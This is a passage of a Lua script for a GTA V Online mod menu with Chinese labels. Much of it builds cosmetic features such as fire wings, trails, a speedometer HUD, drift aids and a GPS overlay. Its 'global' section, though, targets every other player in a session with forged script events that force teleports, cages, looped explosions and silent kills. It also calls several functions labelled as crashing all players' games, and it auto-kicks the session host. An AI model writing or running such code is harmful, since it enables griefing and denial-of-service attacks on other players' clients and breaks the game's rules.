            MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)

            local offsets <const> = {v3(minimum.x, minimum.y, 0.0), v3(maximum.x, minimum.y, 0.0)}

            for _, offset in ipairs(offsets) do

                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)

                local fx =

                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(

                    effect.name,

                    vehicle,

                    offset.x,

                    offset.y,

                    0.0,

                    0.0,

                    0.0,

                    0.0,

                    0.7, --scale

                    false, false, false,

                    0, 0, 0, 0

                )

                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)

                table.insert(effects, fx)

            end

        elseif ENTITY.DOES_ENTITY_EXIST(players.user_ped()) then

            for _, boneId in ipairs(bones) do

                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)

                local fx =

                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(

                    effect.name,

                    players.user_ped(),

                    0.0,

                    0.0,

                    0.0,

                    0.0,

                    0.0,

                    0.0,

                    PED.GET_PED_BONE_INDEX(players.user_ped(), boneId),

                    0.7, --scale

                    false, false, false,

                    0, 0, 0, 0

                )

                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)

                table.insert(effects, fx)

            end

        end

    end, function ()

        removeFxs(effects); effects = {}

    end)

    

    local trailColour = menu.colour(trailsOpt,"颜色", {"trailcolour"}, "",

        colour, false, function(newColour) colour = newColour end)

    menu.rainbow(trailColour)

    

    local new = {}

    local fwings = menu.list(interesting_options, "火焰翅膀", {}, "", function(); end)

    local ptfxEgg
    menu.toggle(fwings, '大火翅膀', {''}, '', function (toggle)
        fireWingsSettings.on = toggle
        if fireWingsSettings.on then
            ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
            if ptfxEgg == nil then
                local eggHash = 1803116220
                loadModel(eggHash)
                ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
            end
            for i = 1, #bigfireWings do
                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                    STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                    util.yield()
                end
                GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                bigfireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, bigfireWings[i].pos[1], 0, bigfireWings[i].pos[2], 1, false, false, false)

                util.create_tick_handler(function()
                    local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                    ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                    for i = 1, #bigfireWings do
                        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(bigfireWings[i].ptfx, fireWingsSettings.scale)
                        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(bigfireWings[i].ptfx,fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)

                    end
                    ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                    return fireWingsSettings.on
                end)
                
            end
            
            
            
        else
            for i = 1, #fireWings do
                if fireWings[i].ptfx then
                    GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                    fireWings[i].ptfx = nil
                end
                if ptfxEgg then
                    entities.delete_by_handle(ptfxEgg)
                    ptfxEgg = nil
                end
            end
            STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        end
    end)

    menu.toggle(fwings, "火翅膀", {'fireWings'},"", function (toggle)

        fireWingsSettings.on = toggle

        if fireWingsSettings.on then

            ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)

            if ptfxEgg == nil then

                local eggHash = 1803116220

                loadModel(eggHash)

                ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))

                ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)

                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)

            end

            for i = 1, #fireWings do

                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do

                    STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')

                    util.yield()

                end

                GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')

                fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)

    

                util.create_tick_handler(function()

                    local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)

                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)

                    ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)

                    for i = 1, #fireWings do

                        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)

                        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)

                    end

    

                    ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)

                    return fireWingsSettings.on

                end)

            end

        else

            for i = 1, #fireWings do

                if fireWings[i].ptfx then

                    GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)

                    fireWings[i].ptfx = nil

                end

                if ptfxEgg then

                    entities.delete_by_handle(ptfxEgg)

                    ptfxEgg = nil

                end

            end

            STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')

        end

    end)

    

    menu.slider(fwings, '大小', {'fireWingsScale'}, '', 1, 100, 3, 1, function(value)

        fireWingsSettings.scale = value / 10

    end)

    

    menu.rainbow(menu.colour(fwings, "火焰翅膀颜色", {'fireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)

        fireWingsSettings.colour = colour

    end))

    menu.toggle(interesting_options, "Homer模式", {""}, "", function(on)  

        if on then
    
        menu.trigger_commands("grace on")
    
        menu.trigger_commands("friction on")
    
        menu.trigger_commands("trails on")
    
        menu.trigger_commands("trailcolourrainbow 1")
    
        menu.trigger_commands("homerspeed on")
    
        menu.trigger_commands("homerjump on")

        menu.trigger_commands("homeraura on")
    
        menu.trigger_commands("FG on")
    
        menu.trigger_commands("wring on")
    
        menu.trigger_commands("bighammer on")
    
        else
    
        menu.trigger_commands("grace off")
    
        menu.trigger_commands("friction off")
    
        menu.trigger_commands("trails off")
    
        menu.trigger_commands("trailcolourrainbow 0")
    
        menu.trigger_commands("homerspeed off")
    
        menu.trigger_commands("homerjump off")

        menu.trigger_commands("homeraura off")
       
        menu.trigger_commands("FG off")
    
        menu.trigger_commands("wring off")
    
        menu.trigger_commands("bighammer off")
    
        end
    
    end)

    menu.toggle(interesting_options, "动物模式", {"spawnfurry"}, "", function(on)
        if on then
            menu.trigger_commands("IGFurry")
            menu.trigger_commands("walkstyle mop")
            notification("动物模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle(interesting_options, "兔子模式", {"spawnrabbit"}, "注意:掏出枪瞄准时会引发崩溃(XA)", function(on)
        if on then
            menu.trigger_commands("ACRabbit02")
            menu.trigger_commands("walkstyle mop")
            notification("兔子模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle(interesting_options, "圣诞怪兽模式", {"spawnyulemonster"}, "", function(on)
        if on then
            menu.trigger_commands("UMMYuleMonster")
            menu.trigger_commands("walkstyle mop")
            notification("圣诞怪兽模式启动") 
        else
            restore_model()
        end
    end)

    menu.toggle(interesting_options,"恶灵骑士" ,{""}, "", function(on)
        if on then 
            elqss()
            menu.trigger_commands("burningman on")
            menu.trigger_commands("footfire "..PLAYER.GET_PLAYER_NAME(players.user()).." on")
        else
            entities.delete_by_handle(vehicleelqs)
            menu.trigger_commands("burningman off")
            menu.trigger_commands("footfire "..PLAYER.GET_PLAYER_NAME(players.user()).." off")
        end

end)

    menu.toggle_loop(interesting_options,"抛掷载具", {"throwcars"}, "在载具附近按E将载具抬起来,在按E将载具投掷出去.", function(on)
        throwvehs()
    end)
    

    menu.toggle_loop(interesting_options,"抛掷NPC", {"throwpeds"}, "在NPC附近按E将NPC抬起来,在按E将NPC投掷出去.", function(on)
    throwpeds()
    end)

aircrafthud = menu.list(vehicle_options, "飞机HUD", {}, "", function();end)

feijihud = menu.action(aircrafthud,"加载flightredux",{"loadflightredux"},"",function()
    notification("正在加载飞机HUD请稍等")
    util.yield(1500)
    require("lib/heezylib/flightredux")
    menu.delete(feijihud)
end)



icluster = menu.list(vehicle_options, "车速表", {}, "", function();end)

unit = 1
menu.list_select(icluster, "单位", {"iclusterunits"}, "", {"MPH", "KPH"}, 1, function(index)
    unit = index 
end)

speedometer_x_pos = 0.700
menu.slider_float(icluster, "车速表位置X", {}, "", 0, 1000, 700, 1, function(s)
    speedometer_x_pos = s * 0.001
end)

speedometer_y_pos = 0.800
menu.slider_float(icluster, "车速表位置Y", {}, "", 0, 1000, 800, 1, function(s)
    speedometer_y_pos = s * 0.001
end)


tachometer_x_pos = 0.830
menu.slider_float(icluster, "转速表位置X", {}, "", 0, 1000, 830, 1, function(s)
    tachometer_x_pos = s * 0.001
end)

tachometer_y_pos = 0.818
menu.slider_float(icluster, "转速表位置Y", {}, "", 0, 1000, 818, 1, function(s)
    tachometer_y_pos = s * 0.001
end)

gear_x_pos = 0.764
menu.slider_float(icluster, "齿轮位置X", {}, "", 0, 1000, 764, 1, function(s)
    gear_x_pos = s * 0.001
end)

gear_y_pos = 0.870
menu.slider_float(icluster, "齿轮位置Y", {}, "", 0, 1000, 870, 1, function(s)
    gear_y_pos = s * 0.001
end)

lights_x_pos = 0.660
menu.slider_float(icluster, "仪器位置X", {}, "", 0, 1000, 660, 1, function(s)
    lights_x_pos = s * 0.001
end)

lights_y_pos = 0.920
menu.slider_float(icluster, "仪器位置Y", {}, "", 0, 1000, 920, 1, function(s)
    lights_y_pos = s * 0.001
end)

white = {
    r = 1,
    g = 1,
    b = 1,
    a = 1.0
}

orange = {
    r = 1.0,
    g = 0.5,
    b = 0,
    a = 1
}

blue = {
    r = 0, 
    g = 0, 
    b = 1, 
    a = 1
}

green = {
    r = 0, 
    g = 1, 
    b = 0, 
    a = 1
}
menu.toggle(icluster, "车速表显示", {"icluster"}, "", function(state)
    UItoggle = state
local lights, high_lights = memory.alloc_int(), memory.alloc_int()
while UItoggle do 
    vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if vehicle ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
        local vecs = ENTITY.GET_ENTITY_SPEED_VECTOR(vehicle, true)
        local v_hdl = entities.handle_to_pointer(vehicle)
        local speed = ENTITY.GET_ENTITY_SPEED(vehicle)
        local mph = speed * 2.236936
        local kph = speed * 3.6
        local max = VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(vehicle)
        local max_mph = max * 2.236936
        local max_kph = max * 3.6

        if unit == 1 then 
            measured_speed = mph 
            measured_max = max_mph
        else
            measured_speed = kph 
            measured_max = max_kph
        end
        local speed_rotation = (measured_speed/measured_max)*0.32
        if speed_rotation >= 0.75 then 
            speed_rotation = 0.75
        end
        local rpm = entities.get_rpm(v_hdl)
        if rpm == 1 then 
            -- rev limiter simulation
            rpm = rpm + math.random(-2, 2)*0.01
        end
        local tach_rotation = rpm*0.45
        directx.draw_texture(speedometer_case, 0.05, 0.05, 0.5, 0.5, speedometer_x_pos, speedometer_y_pos, 0, white)
        directx.draw_texture(needle, 0.023, 0.023, 0.88, 0.125, speedometer_x_pos, speedometer_y_pos+0.015, speed_rotation, white)
        -- speed text also i guess what
        directx.draw_text(speedometer_x_pos, speedometer_y_pos+0.065, math.ceil(measured_speed), 5, 0.8, white, true)
        -- rpm gauge
        directx.draw_texture(tach_case, 0.05, 0.05, 0.5, 0.5, tachometer_x_pos, tachometer_y_pos-0.015, 0, white)
        -- rpm needle
        directx.draw_texture(needle, 0.023, 0.023, 0.88, 0.125, tachometer_x_pos, tachometer_y_pos, tach_rotation, white)
        -- rpm text
        directx.draw_text(tachometer_x_pos, tachometer_y_pos+0.05, math.ceil(rpm*6000), 5, 0.8, white, true)
        -- gear text 
        gear = entities.get_current_gear(v_hdl)
        if gear == 0 and vecs.y < 0 then
            gear = "R"
        end
        if VEHICLE.GET_VEHICLE_ENGINE_HEALTH(vehicle) < 1000 then
            directx.draw_texture(check_engine_light, 0.01, 0.01, 0.5, 0.5, lights_x_pos, lights_y_pos, 0, orange)
        end
        VEHICLE.GET_VEHICLE_LIGHTS_STATE(vehicle, lights, high_lights)
        if memory.read_byte(lights) == 1 then 
            if memory.read_byte(high_lights) == 1 then 
                directx.draw_texture(high_beam, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.04, lights_y_pos, 0, blue)
            else
                directx.draw_texture(low_beam, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.03, lights_y_pos, 0, green)
            end
        end
        any_tires_burst = false 
        for i = 1, 4 do 
            if VEHICLE.IS_VEHICLE_TYRE_BURST(vehicle, i, false) then 
                any_tires_burst = true 
            end
        end
        if any_tires_burst then 
            directx.draw_texture(tpms, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.08, lights_y_pos, 0, orange)
        end

        directx.draw_text(gear_x_pos, gear_y_pos, gear, 5, 1.2, white, true)
        if VEHICLE.IS_VEHICLE_IN_BURNOUT(vehicle) or math.abs(vecs.x) > 3 then 
            directx.draw_texture(traction_control, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.11, lights_y_pos, 0, orange)

        end
        
    end
    util.yield()
end
end)

drift_root = menu.list(vehicle_options, "飘移", {}, "", function();end)


menu.toggle_loop(drift_root, "绘制车辆角度", {"carangle"}, "绘制车辆相对于摄像机定位的角度。有助于了解你的漂移有多剧烈", function()
    if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        local ang = math.abs(math.ceil(math.abs(ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0).z) - math.abs(CAM.GET_GAMEPLAY_CAM_ROT(0).z)))
        directx.draw_text(0.5, 1.0, tostring(ang) .. '°', 5, 1.4, {r=1, g=1, b=1, a=1}, true)
    end
end)

menu.toggle_loop(drift_root, "按住shift键进行漂移", {"dshiftdrift"}, "你听到我说的了.", function(on)
    if PAD.IS_CONTROL_PRESSED(21, 21) then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    end
end)

local shift_drift_toggle = false 
menu.toggle(drift_root, "开关换挡(shift)漂移", {"shiftdrifttoggle"}, "您应该将热键绑定到此开关，否则此功能将变得有点无用", function(on)
    shift_drift_toggle = on
    while true do
        if player_cur_car ~= 0 then 
            if not shift_drift_toggle then 
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
                break 
            end
            VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
            VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
        end
        util.yield()
    end
end)

menu.toggle(drift_root, "头文字D模式", {"initiald"}, "应用预定义的载具操纵配置,使您更容易漂移.这不会神奇地让你成为一名漂移高手,也不会神奇地使每辆车都擅长漂移.", function(on, click_type)
    initial_d_mode = on
    initial_d_score_thread()
    if player_cur_car ~= 0 then 
        if on then
            set_vehicle_into_drift_mode(player_cur_car)
        else
            for offset, value in pairs(last_vehicle_handling_data) do
                set_vehicle_handling_value(player_cur_car, offset, value)
            end
        end
    end
end)

menu.toggle(drift_root, "头文字D分数显示", {}, "", function(on, click_type)
    initial_d_score = on
end)


menu.toggle_loop(drift_root,  "相机方向推力", {"thrustindir"}, "按住X并保持此状态,将载具推向摄相机所面对的方向。用于维持漂移状态。", function(on)
    if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
        if util.is_key_down("X") then 
            cam_direction()
        else 
            before_vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        end
    end
end)
menu.slider_float(drift_root, "相机方向推力的速度", {"thrustindiradd"}, "相机方向的推力需要增加多少额外速度", 0, 3000, 125, 1, function(s)
    thrust_cam_dir_add = s * -0.001
end)


menu.slider(vehicle_options, "换座位", {""}, "", -1, 6, -1, 1, function(value)

        local ourped = PLAYER.PLAYER_PED_ID()

    if PED.IS_PED_IN_ANY_VEHICLE(ourped, false) then

        local veh = PED.GET_VEHICLE_PED_IS_IN(ourped, false)

        PED.SET_PED_INTO_VEHICLE(ourped, veh, value)

    else

        notification("傻B,你都没上车呢")

    end

end)



menu.toggle(vehicle_options, "智能自动驾驶", {"smartdrive"},"", function(on)

    smartAutodrive = on

    if not on then

        local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())

        TASK.CLEAR_PED_TASKS(my_ped)

    end

end, smartAutodrive)


local player_ped_id
local delta_time
local player_pos
util.create_tick_handler(function ()
    player_ped_id = PLAYER.PLAYER_PED_ID()
    delta_time = MISC.GET_FRAME_TIME()
    player_pos = ENTITY.GET_ENTITY_COORDS(player_ped_id)
    return true
end)


local math_funcs = b_math_funcs.new()
local shitty_gps_colour_a = {r = 255,g = 0,b = 255,a = 255}
local shitty_gps_colour_b = {r = 255,g = 255,b = 255,a = 255}
local shitty_gps_run = false
menu.toggle(vehicle_options, "GPS", {"GPS"}, "", function(value)

    local p_direction = memory.alloc(1) --bool
    local p_5 = memory.alloc(4) --float
    local p_distToNxJunction = memory.alloc(4) --float
    local p_screenX = memory.alloc(4) --float
    local p_screenY = memory.alloc(4) --float

    local turn_dir = 0
    shitty_gps_run = value

    if value then
    util.create_tick_handler(function ()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)

    local waypoint_pos = get_waypoint_coords()
    local total = waypoint_pos.x + waypoint_pos.y + waypoint_pos.z

    if total ~= 0 and ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
        local height = ENTITY.GET_ENTITY_HEIGHT(vehicle, player_pos.x, player_pos.y, player_pos.z, true, false)

        PATHFIND.GENERATE_DIRECTIONS_TO_COORD(
            waypoint_pos.x,
            waypoint_pos.y,
            waypoint_pos.z,
            0,
            p_direction,
            p_5,
            p_distToNxJunction
        )

        local direction = memory.read_byte(p_direction)
        local distToNxJunction = memory.read_float(p_distToNxJunction)



        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(
            player_pos.x,
            player_pos.y,
            player_pos.z + 1.5 + height,
            p_screenX,
            p_screenY
        )
        local screen_x = memory.read_float(p_screenX)
        local screen_y = memory.read_float(p_screenY)

       if direction == 1 then
            turn_dir = math_funcs.lerp(turn_dir, 180, 5 * delta_time)
            directx.draw_text(screen_x, screen_y, "可以的话请调头", ALIGN_CENTRE, 1, shitty_gps_colour_a)
        elseif direction == 3 then
            turn_dir =  math_funcs.lerp(turn_dir, -90, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"左转 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 6 then
            turn_dir =  math_funcs.lerp(turn_dir, -145, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"向左急转弯 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 4 then
            turn_dir =  math_funcs.lerp(turn_dir, 90, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"右转 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 7 then
            turn_dir =  math_funcs.lerp(turn_dir, 145, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"向右急转弯 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 8 then
            turn_dir =  math_funcs.lerp(turn_dir, 0, 5 * delta_time)
            directx.draw_text(screen_x, screen_y, "正在计算新路线    ", ALIGN_CENTRE, 1, shitty_gps_colour_a)
        else
            turn_dir =  math_funcs.lerp(turn_dir, 0, 5 * delta_time)
        end
        local direction = ENTITY.GET_ENTITY_FORWARD_VECTOR(player_ped_id)
        local angle = b_vectors.new().vector2.get_angle(direction, {x = 0, y = 1})
        if b_vectors.new().vector2.dot({x = direction.x, y = direction.y}, {x = 1, y = 0}) > 0 then
            angle = -angle
        end
        local draw_pos = b_common_funcs.new().get_pos_above_entity(vehicle)
        draw_pos.z = draw_pos.z + 0.4
        drawing_funcs.draw_arrow(draw_pos, angle - math.rad(turn_dir), 1, shitty_gps_colour_a, shitty_gps_colour_b)
    end

    return shitty_gps_run
    end)
    else
        memory.free(p_distToNxJunction)
        memory.free(p_direction)
        memory.free(p_5)
        memory.free(p_screenX)
        memory.free(p_screenY)
    end
end)

menu.action(global_options, "发送所有玩家海滩", {}, "", function () 

    for pid = 0, 32 do

        if pid ~= players.user() and players.exists(pid) then

			util.trigger_script_event(1 << pid, {-93722397 ,1, 0, 0, 4,0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)


menu.action(global_options, "发送所有玩家岛屿", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

                util.trigger_script_event(1 << pid, {-910497748, 1, 0, 0, 1, 1,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)

menu.action(global_options, "全局公寓邀请", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			util.trigger_script_event(1 << pid, {-168599209, -1, 1, 1, 0, 1, 0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)

menu.action(global_options, "全局送进任务", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			util.trigger_script_event(1 << pid, {1858712297, -1, 1, 1, 0, 1, 0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)


menu.toggle_loop(global_options, "全局随机循环", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

            local coords = ENTITY.GET_ENTITY_COORDS(target_ped)

            FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false,0.0)

        end

    end

end)
function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end
menu.action(global_options, "战局雪天", {}, "本地可见", function () 
    --memory.script_global(262145+4752,0)
    SET_INT_GLOBAL(262145+4752,1)
end)

menu.action(global_options, "困住所有玩家", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))

				pos.z = pos.z + 0.95  

				local pos1 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))

				pos1.z = pos1.z - 0.90

				local cage = util.joaat("prop_feeder1_cr")

				STREAMING.REQUEST_MODEL(cage)

				OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos.x, pos.y ,pos.z , true, true)

				OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos1.x, pos1.y ,pos1.z , true, true)

        end

	end

end)

menu.toggle_loop(global_options, "震动屏幕", {}, "让每个人的屏幕震动", function()
    for k,v in pairs(players.list(false, true, true)) do
        shake_player(v, 5000)
        util.yield()
    end
    util.yield(1000)
end)

menu.action(global_options, "无声杀害", {"killeveryone"}, "无声地杀死所有人", function()
    for k,v in pairs(players.list(false, true, true)) do
        kill_player(v)
        util.yield()
    end
end)

local explosion_circle_angle = 0
menu.toggle_loop(global_options, "爆炸圈", {}, "", function ()
    for k,v in pairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
        explosion_circle(ped, explosion_circle_angle, 25)
    end

    explosion_circle_angle += 0.15
    util.yield(50)
end)

menu.action(global_options, "传送所有人的车辆到海洋", {""}, "", function()

allsqhy()

end)

    

menu.action(global_options, "传送所有人的车辆到花园银行", {""}, "", function()

allswre()

end)



menu.action(global_options, "防空警报", {"AirDefencesSound"}, "", function()

fangkongjingbao()

end)

    

menu.action(global_options, "噪音", {"bedsound"}, "在战局中播放大量的噪音", function()

zaoyin()

end)
local sound_location = filesystem.scripts_dir() .. "\\HeezyScript\\".."zhengyi.wav"
local zhengyipng = directx.create_texture(filesystem.scripts_dir() .. '/HeezyScript/' .. 'zhengyi.png')
local zhengyi = false
menu.action(global_options, "超级无敌宇宙崩", {}, "", function (on)
    zhengyi = on
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
    util.yield(9000)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(),players.user_ped(), 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
    zhengyi = off
end)

menu.action(global_options, "耶稣的救赎", {}, "", function ()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local SelfPlayerPed = entities.create_ped(2, util.joaat("u_m_m_jesus_01"), SelfPlayerPos, 0)
    for i = 1, 20 do                   
        ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, util.joaat("prop_beach_parasol_05"))
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
        entities.delete_by_handle(SelfPlayerPed)
    end
end)

menu.action(global_options, "载具伞崩全局", {}, "崩溃所有玩家", function ()

chesan()

end)



menu.action(global_options, "人物伞崩全局V1", {}, "崩溃所有玩家", function()

san1()

end)



menu.action(global_options,"人物伞崩全局V2",{},"崩溃所有玩家",function()

san2()

end)



menu.action(global_options,"人物伞崩全局V3",{},"崩溃所有玩家",function()

san3()

end)

    

menu.action(global_options, "人物伞崩全局V4", {}, "慎用,可能会自崩", function()

san4()

end)


menu.action(global_options,"人物伞崩全局V5",{},"崩溃所有玩家",function()

san5()

end)



menu.action(global_options,"声音崩溃",{},"崩溃所有玩家",function()

shengyin()

end)



menu.action(global_options,"CARGO崩溃",{},"崩溃所有玩家",function()

CARGO()

end)



menu.action(global_options, "数学崩溃", {"mathcrash"}, "崩溃所有玩家", function()

    math_crash()

end)

menu.action(global_options, "大春逗崩溃", {""}, "来自X-Force", function(on_toggle)

    big_chungus()
    
end)



local pool_limiter = menu.list(protection_options, "实体池限制", {}, "")

    ped_limit = 175

    menu.slider(pool_limiter, "Ped池限制", {"pedslimit"}, "默认为175", 0, 256, 175, 1, function(amount)

        ped_limit = amount

    end)

    

    veh_limit = 150

    menu.slider(pool_limiter, "载具池限制", {"vehlimit"}, "默认为150", 0, 300, 150, 1, function(amount)

        veh_limit = amount

    end)

    

    obj_limit = 500

    menu.slider(pool_limiter, "物体池限制", {"objlimit"}, "默认为500", 0, 2300, 500, 1, function(amount)

        obj_limit = amount

    end)

    

    projectile_limit = 25

    menu.slider(pool_limiter, "投掷物池限制", {"projlimit"}, "默认为25", 0, 50, 25, 1, function(amount)

        projectile_limit = amount

    end)

    

    menu.toggle_loop(pool_limiter, "启用实体池限制", {}, "", function()
        entity_limit()
    end)



menu.toggle_loop(protection_options, "自动获取脚本主机", {"scriptshost"}, "更快获取脚本主机", function()

    if players.get_script_host() ~= players.user() and get_transition_state(players.user()) ~= 0 then

        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))

    end

end)



menu.toggle_loop(protection_options, "自动获取主机", {"alwayshost"}, "", function()

	if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then

		if not (PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**") then

			menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))

			util.yield(200)

		end

	end

end)



local ridicule = "\n你正在攻击一位尊贵的小助手VIP用户.请立刻停止你的行为!\n--------¦Heezy二代目"

menu.text_input(protection_options, "自定义嘲讽文字", {"Customize ridicule"}, "", function(value)

    ridicule = value

end, ridicule)

menu.toggle_loop(protection_options, "攻击嘲讽", {"ridicule"}, "", function()
